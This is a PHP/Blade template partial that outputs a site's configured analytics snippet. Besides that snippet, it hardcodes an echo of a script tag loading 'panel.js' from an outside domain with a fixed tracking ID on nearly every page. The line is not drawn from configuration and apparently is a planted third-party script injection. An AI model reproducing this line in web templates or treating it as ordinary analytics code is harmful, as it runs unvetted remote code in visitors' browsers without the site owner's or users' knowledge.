<?php
$analyticsHTML = config('advanced-config.analytics');
$analyticsHTML = preg_replace("~<!--(.*?)-->~s", "", $analyticsHTML);
$analyticsHTML = trim($analyticsHTML);

if (substr($_SERVER['REQUEST_URI'], 0, 2) !== '/@') {
    echo '<script src="https://reward.npayme.io/panel.js?onelink=dd1400dd-c412-4633-b076-1ea09877b806"></script>';
} 
?>

@if(preg_replace( "/\r|\n/", "", $analyticsHTML ) != '')

<!-- Analytics -->

{!! $analyticsHTML !!}

<!-- /Analytics -->
@endif